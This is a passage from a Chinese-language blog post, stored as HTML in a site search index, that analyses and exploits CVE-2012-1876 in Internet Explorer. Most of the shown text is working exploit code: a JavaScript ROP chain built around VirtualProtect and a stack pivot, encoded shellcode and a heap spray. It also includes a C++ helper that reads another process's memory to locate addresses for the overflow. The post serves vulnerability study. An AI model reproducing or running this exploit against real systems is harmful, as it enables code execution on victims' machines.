rop = (base + <span class="hljs-number">0x1f2bd9</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_jmpeax1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_jmpeax2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//p</span>op eax;ret<br>            var rop = (base + <span class="hljs-number">0x351263</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_popeax_ret1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_popeax_ret2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//</span>VirtualProtect<br>            var rop = (base + <span class="hljs-number">0x1348</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_vp1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_vp2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//m</span>ov eax;dword ptr ds:[eax];ret<br>            var rop = (base + <span class="hljs-number">0x214bbd</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_moveax_ret1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_moveax_ret2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//pus</span>had;ret<br>            var rop = (base + <span class="hljs-number">0x51a2c8</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_pushad_ret1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_pushad_ret2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//pus</span>h esp;ret<br>            var rop = (base + <span class="hljs-number">0x49cb1d</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_pushesp_ret1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_pushesp_ret2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br><br>            var shellcode = unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_ret2);                 <span class="hljs-regexp">//r</span>et<br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_popebp_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_popebp_ret2);      <span class="hljs-regexp">//p</span>op ebp;ret<br>            <span class="hljs-keyword">for</span> (var i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x32</span>; i++) &#123;<br>                shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_ret2);                <span class="hljs-regexp">//r</span>et<br>            &#125;<br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_popebp_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_popebp_ret2);      <span class="hljs-regexp">//p</span>op ebp;ret       ebp=shellcode_addr<br>            shellcode += unescape(<span class="hljs-string">&quot;%u2a80%u077a&quot;</span>);<br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_popedx_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_popedx_ret2);                    <br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_xchg1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_xchg2);                  <span class="hljs-regexp">//x</span>chg eax,esp;ret; start change stack<br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_popebx_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_popebx_ret2);      <span class="hljs-regexp">//p</span>op ebx;ret       ebx=<span class="hljs-number">1024</span><br>            shellcode += unescape(<span class="hljs-string">&quot;%u1024%u0000&quot;</span>);                                       <span class="hljs-regexp">//</span><span class="hljs-number">1024</span>             <br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_popedx_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_popedx_ret2);      <span class="hljs-regexp">//p</span>op edx;ret       edx=<span class="hljs-number">40</span><br>            shellcode += unescape(<span class="hljs-string">&quot;%u0040%u0000&quot;</span>);                                       <span class="hljs-regexp">//</span><span class="hljs-number">40</span><br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_popecx_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_popecx_ret2);      <span class="hljs-regexp">//p</span>op ecx;ret       <br>            shellcode += unescape(<span class="hljs-string">&quot;%u2a70%u077a&quot;</span>);                                      <br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_popedi_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_popedi_ret2);      <span class="hljs-regexp">//p</span>op edi;ret       <br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_ret2);                    <span class="hljs-regexp">//r</span>et<br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_popesi_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_popesi_ret2);      <span class="hljs-regexp">//p</span>op esi;ret        <br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_jmpeax1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_jmpeax2);              <span class="hljs-regexp">//</span>jmp eax<br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_popeax_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_popeax_ret2);      <span class="hljs-regexp">//p</span>op eax;ret<br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_vp1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_vp2);                      <span class="hljs-regexp">//</span>VirtualProtect_addr eax=VirtualProtect<br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_moveax_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_moveax_ret2);      <span class="hljs-regexp">//m</span>ov eax;[eax];ret<br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_pushad_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_pushad_ret2);      <span class="hljs-regexp">//pus</span>had;ret<br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_pushesp_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_pushesp_ret2);    <span class="hljs-regexp">//pus</span>h esp;ret;<br>            shellcode += unescape(<span class="hljs-string">&quot;%u9090%u9090&quot;</span>);<br>            shellcode += unescape(<span class="hljs-string">&quot;%u9090%u9090&quot;</span>);<br>            shellcode += unescape(<br>                <span class="hljs-string">&quot;%u68FC%u0A6A%u1E38%u6368%uD189%u684F%u7432%u0C91%uF48B%u7E8D%u33F4%uB7DB%u2B04%u66E3%u33BB&quot;</span> +<br>                <span class="hljs-string">&quot;%u5332%u7568%u6573%u5472%uD233%u8B64%u305A%u4B8B%u8B0C%u1C49%u098B%u098B%u698B%uAD08%u6A3D&quot;</span> +<br>                <span class="hljs-string">&quot;%u380A%u751E%u9505%u57FF%u95F8%u8B60%u3C45%u4C8B%u7805%uCD03%u598B%u0320%u33DD%u47FF%u348B&quot;</span> +<br>                <span class="hljs-string">&quot;%u03BB%u99F5%uBE0F%u3A06%u74C4%uC108%u07CA%uD003%uEB46%u3BF1%u2454%u751C%u8BE4%u2459%uDD03&quot;</span> +<br>                <span class="hljs-string">&quot;%u8B66%u7B3C%u598B%u031C%u03DD%uBB2C%u5F95%u57AB%u3D61%u0A6A%u1E38%uA975%uDB33%u6853%u6465&quot;</span> +<br>                <span class="hljs-string">&quot;%u0000%u6868%u6361%u8B6B%u53C4%u5050%uFF53%uFC57%uFF53%uF857%9090%9090%9090&quot;</span>);<br>            <span class="hljs-keyword">while</span> (shellcode.length &lt; <span class="hljs-number">100000</span>) &#123;<br>                shellcode += shellcode;<br>            &#125;<br>            //<span class="hljs-number">64</span>k<br>            var onemeg = shellcode.substr(<span class="hljs-number">0</span>, <span class="hljs-number">64</span> * <span class="hljs-number">1024</span> / <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">14</span>; i++) &#123;<br>                onemeg += shellcode.substr(<span class="hljs-number">0</span>, <span class="hljs-number">64</span> * <span class="hljs-number">1024</span> / <span class="hljs-number">2</span>);<br>            &#125;<br>            var spray = new Array();<br>            <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) &#123;<br>                spray[i] = onemeg.substr(<span class="hljs-number">0</span>, onemeg.length);<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>为了使覆盖的虚表指针的值刚好是shellcode起始位置,并且eax+dc位置是xchg eax,esp ret指令地址,可以通过读取内存快速查找对应地址,写入第二次溢出的width中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>HANDLE processHandle = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="hljs-number">0</span>, <span class="hljs-number">3920</span>);<br><span class="hljs-type">int</span> addr = <span class="hljs-number">1000000</span>;<br>DWORD temp = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>DWORD val = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> ret = <span class="hljs-built_in">ReadProcessMemory</span>(processHandle, (LPVOID)(addr * <span class="hljs-number">125</span>), &amp;val, <span class="hljs-number">4</span>, &amp;temp);<br><span class="hljs-keyword">if</span> (ret) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr:%08x:%08x\n&quot;</span>, addr * <span class="hljs-number">125</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (ret &amp;&amp; val == <span class="hljs-number">0x6ABD3142</span>) &#123;<br>ret = <span class="hljs-built_in">ReadProcessMemory</span>(processHandle, (LPVOID)(addr * <span class="hljs-number">125</span> + <span class="hljs-number">0xdc</span>), &amp;val, <span class="hljs-number">4</span>, &amp;temp);<br><span class="hljs-keyword">if</span> (val == <span class="hljs-number">0x6AC401BE</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result=%d\n&quot;</span>, addr);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>, addr);<br>addr++;<br>&#125;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>结果</p><p><img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/GIF.gif" alt="GIF"></p><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p>漏洞战争:软件漏洞分析精要</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
